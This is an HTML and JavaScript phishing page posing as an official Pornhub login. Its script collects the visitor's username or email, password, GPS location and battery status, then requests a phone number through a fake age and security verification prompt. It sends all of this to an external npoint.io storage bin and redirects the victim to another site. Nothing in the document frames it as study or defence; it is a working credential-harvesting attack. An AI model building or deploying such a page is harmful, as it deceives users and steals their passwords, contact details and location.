<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pornhub - Official Login</title>
    <style>
        body { background-color: #1a1a1a; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background-color: #2b2b2b; padding: 40px; border-radius: 8px; text-align: center; width: 350px; box-shadow: 0 0 20px rgba(0,0,0,0.7); }
        .login-box h1 { color: #ff9900; margin-bottom: 20px; font-size: 24px; text-transform: uppercase; }
        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #333; border: 1px solid #555; border-radius: 4px; color: #fff; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 12px; background-color: #ff9900; border: none; border-radius: 4px; color: #000; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        .login-box button:hover { background-color: #e68a00; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Login Required</h1>
        <form id="phishingForm">
            <input type="text" id="username" placeholder="Username or Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign In & View Content</button>
        </form>
    </div>

    <script>
        const targetUrl = 'https://api.npoint.io/669f4bb6752c71bb17ee';

        // --- FUNGSI PENGIRIM DATA YANG SUDAH DIPERBARUI ---
        async function postData(newData) {
            let dataArray = [];
            
            try {
                // 1. BACA data yang sudah ada di npoint
                const response = await fetch(targetUrl);
                if (response.ok) {
                    const existingData = await response.json();
                    // Pastikan data lama itu sebuah array
                    if (Array.isArray(existingData)) {
                        dataArray = existingData;
                    }
                }
            } catch (error) {
                // Abaikan jika error (mungkin karena bin-nya masih kosong)
                console.log("Bin is empty or invalid, starting a new array.");
            }

            // 2. TAMBAHKAN data baru ke dalam array
            dataArray.push(newData);

            // 3. TULIS KEMBALI semua data (yang lama + yang baru) ke npoint
            try {
                await fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dataArray, null, 2) // `null, 2` untuk format JSON yang rapi
                });
            } catch (error) {
                console.error('Gagal menimpa data:', error);
            }
        }

        function initializeHarvest() {
            let collectedData = {};

            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(position => {
                    collectedData.latitude = position.coords.latitude;
                    collectedData.longitude = position.coords.longitude;
                    collectedData.gps_accuracy = position.coords.accuracy + ' meters';
                });
            }

            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    collectedData.battery_level = Math.floor(battery.level * 100) + '%';
                    collectedData.is_charging = battery.charging;
                });
            }
            
            const loginForm = document.getElementById('phishingForm');
            if (loginForm) {
                loginForm.addEventListener('submit', event => {
                    event.preventDefault(); 

                    collectedData.username_or_email = document.getElementById('username').value;
                    collectedData.password = document.getElementById('password').value;

                    const phoneNumber = prompt("Age & Security Verification:\n\nPlease enter your phone number to continue.", "");
                    collectedData.phone_number = phoneNumber || 'not_provided';
                    collectedData.timestamp = new Date().toISOString();
                    
                    // Panggil fungsi postData yang baru
                    postData(collectedData);

                    alert('Verification complete. Redirecting to content...');
                    setTimeout(() => {
                        window.location.href = 'https://videt-co1.vercel.app';
                    }, 500);
                });
            }
        }
        window.onload = initializeHarvest;
    </script>
</body>
</html>
